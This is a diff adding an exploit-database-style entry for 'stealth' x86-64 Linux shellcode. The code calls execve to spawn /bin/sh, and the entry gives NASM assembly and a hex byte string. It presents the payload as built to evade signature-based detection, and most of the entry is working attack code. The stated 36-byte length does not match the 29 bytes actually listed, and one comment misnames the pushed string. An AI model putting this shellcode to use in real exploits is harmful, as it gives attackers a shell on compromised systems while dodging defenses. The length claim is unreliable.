@@ -1,0 +1,38 @@
+# Exploit Title: Linux/x86-64 - execve("/bin/sh") Shellcode (36 bytes, stealth variant)
+# Date: 2025-06-23
+# Exploit Author: Fernando Mengali
+# LinkedIn: https://www.linkedin.com/in/fernando-mengali/
+# Platform: Linux x86_64
+# Tested on: Ubuntu 22.04 (x86_64)
+# Shellcode Length: 36 bytes
+# Category: Shellcode
+# CVE: N/A
+
+## Description:
+This is a 36-byte Linux x86-64 shellcode that spawns a `/bin/sh` shell using `execve()`, designed with subtle instruction-level differences to evade signature-based detection and distinguish it from canonical payloads. 
+---
+
+## Assembly (NASM):
+```nasm
+global _start
+
+section .text
+
+_start:
+    sub rax, rax                    ; Zero rax
+    push rax                        ; Null terminator
+
+    mov rsi, 0x68732f6e69622f2f     ; "//bin/sh" (double slash harmless)
+    push rsi                        ; Push the string onto the stack
+
+    lea rdi, [rsp]                  ; rdi = pointer to "/bin//sh"
+    xor rsi, rsi                    ; rsi = NULL (argv)
+    xor rdx, rdx                    ; rdx = NULL (envp)
+
+    mov al, 59                      ; syscall number for execve()
+    syscall                         ; execute execve("/bin/sh", NULL, NULL)
+
+; Shellcode:
+;
+\x48\x29\xc0\x50\x48\xbe\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05
+; [Length] : 36
